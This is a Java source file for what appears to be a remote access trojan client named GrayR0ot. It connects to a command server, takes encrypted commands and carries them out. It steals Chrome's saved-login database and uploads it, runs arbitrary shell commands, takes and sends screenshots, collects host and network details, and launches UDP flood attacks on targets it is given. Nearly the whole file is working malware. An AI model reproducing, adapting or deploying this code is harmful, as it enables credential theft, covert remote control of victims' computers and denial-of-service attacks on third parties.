package eu.grayroot.grayclient;

import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.Socket;
import java.net.SocketException;
import java.net.URL;
import java.net.UnknownHostException;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;
import java.nio.charset.Charset;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.PrivateKey;
import java.security.PublicKey;
import java.security.SecureRandom;
import java.util.Base64;
import java.util.Date;
import java.util.List;

import javax.imageio.ImageIO;
import javax.swing.JOptionPane;

import eu.grayroot.grayclient.cipher.RSA;

public class Client {
	private static final String IP = "0.0.0.0";
	private static final int PORT = 2648;
	public static String ProcessName;
	private static PrivateKey privateKey;
	private static PublicKey publicKey;

	public static void main(String[] args) {
		privateKey = new RSA().loadPrivateKey();
		publicKey = new RSA().loadPublicKey();
		while(true) {
			try {
				Socket s = new Socket(IP,PORT);
				PrintWriter writer = new PrintWriter(s.getOutputStream());
				BufferedReader reader = new BufferedReader(new InputStreamReader(s.getInputStream()));
				while(true) {
					String sel = reader.readLine();
					sel = new RSA().decrypt(sel, privateKey);
					System.out.println("Received command: " + sel);
					switch(sel) {

					case "CHECK":
						writer.println(Base64.getEncoder().encodeToString(new RSA().encryptText(s.getRemoteSocketAddress().toString(), publicKey)));
						writer.flush();
						break;

					case "PING":
						writer.println(Base64.getEncoder().encodeToString(new RSA().encryptText("PING OK", publicKey)));
						writer.flush();
						break;

					case "CLOSE":
						s.close();
						return;

					case "INFO":
						InetAddress addr = InetAddress.getLocalHost();
						writer.println(Base64.getEncoder().encodeToString(new RSA().encryptText("Name: " + addr.getHostName() + "\n"
								+ "OS : " + System.getProperty("os.name") + "\n"
								+ "Public IP: " + SystemGather.getPublicIP() + "\n"
								+ "Private IP: " + SystemGather.getPrivateIP() + "\n"
								+ "MAC: " + SystemGather.getMACAddress(), publicKey)));
						writer.flush();
						break;

					case "CHROME_STEAL":
						File file = new File("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data");
						writer.println(Base64.getEncoder().encodeToString(new RSA().encryptText("File Size: " + file.length() + "\n"
								+ "File Name: " + file.getName() + "\n"
								+ "Public IP: " + file.getName() + "\n"
								+ "MAC: " + file.getName()
								, publicKey)));
						writer.flush();
						Socket socket = new Socket(IP, 4826);
						byte[] byteArray = new byte[8192];
						FileInputStream fis = new FileInputStream(file);  
						BufferedInputStream bis = new BufferedInputStream(fis);
						DataInputStream dis = new DataInputStream(bis);
						OutputStream os;
						try {
							os = socket.getOutputStream();
							DataOutputStream dos = new DataOutputStream(os);
							dos.writeLong(byteArray.length);
							int read;
							while((read = dis.read(byteArray)) != -1){
								dos.write(byteArray, 0, read);
							}

						} catch (IOException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}
						socket.close();
						break;

					case "EXEC":
						String commandOutput = ExecuteCommads(new RSA().decrypt(reader.readLine(), privateKey));
						writer.println(Base64.getEncoder().encodeToString(new RSA().encryptText(commandOutput, publicKey)));
						writer.flush();
						break;

					case "MSG":
						String message = new RSA().decrypt(reader.readLine(), privateKey);
						JOptionPane.showMessageDialog(null,message,"GrayR0ot", JOptionPane.INFORMATION_MESSAGE);
						break;

					case "SCREEN":
						Robot robot = new Robot();
						String format = "jpg";
						String fileName = new Date().getTime() + ".jpg";
						Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
						BufferedImage screenFullImage = robot.createScreenCapture(screenRect);
						ImageIO.write(screenFullImage, format, new File(fileName));
						file = new File(fileName);
						writer.println(Base64.getEncoder().encodeToString(new RSA().encryptText("File Size: " + file.length() + "\n"
								+ "File Name: " + file.getName() + "\n"
								+ "Public IP: " + file.getName() + "\n"
								+ "MAC: " + file.getName()
								, publicKey)));
						writer.flush();
						socket = new Socket(IP, 4826);
						byteArray = new byte[8192];
						fis = new FileInputStream(file);  
						bis = new BufferedInputStream(fis);
						dis = new DataInputStream(bis);
						try {
							os = socket.getOutputStream();
							DataOutputStream dos = new DataOutputStream(os);
							dos.writeLong(byteArray.length);
							int read;
							while((read = dis.read(byteArray)) != -1){
								dos.write(byteArray, 0, read);
							}

						} catch (IOException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}
						socket.close();
						break;

					case "UDP":
						String targetIP = new RSA().decrypt(reader.readLine(), privateKey);
						int targetPort = Integer.valueOf(new RSA().decrypt(reader.readLine(), privateKey));
						DatagramSocket datagramSocket = null;
						InetAddress inetAddress = null;
						byte[] buf = new byte[65507];
						SecureRandom random = new SecureRandom();

						try {
							datagramSocket = new DatagramSocket();
						} catch (SocketException e) {
							e.printStackTrace();
						}

						try {
							inetAddress = InetAddress.getByName(targetIP);
						} catch (UnknownHostException e) {
							e.printStackTrace();
						}

						random.nextBytes(buf); 
						DatagramPacket packet = new DatagramPacket(buf, buf.length, inetAddress, targetPort);

						try {
							System.out.printf("[*] Start flooding %s:%d\n", targetIP, targetPort);
							for(int i = 0; i<10000; i++) {
								datagramSocket.send(packet);
							}
						} catch (IOException e) {
							e.printStackTrace();
						}
						datagramSocket.close();
						System.out.println("Attack finished!");
						break;

					default:
						break;
					}

				}
			} catch (Exception e) {

			};
			try {
				Thread.sleep(10000);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
	}

	public static String ExecuteCommads(String command) throws IOException, InterruptedException {
		Process process = Runtime.getRuntime().exec(command);
		BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
		StringBuilder sb = new StringBuilder();
		String line = bufferedReader.readLine();
		while ((line = bufferedReader.readLine()) != null) {
			sb.append(line);
			sb.append(System.lineSeparator());
			line = bufferedReader.readLine();
		}	      
		String everything = sb.toString();
		return everything;			  
	}
}
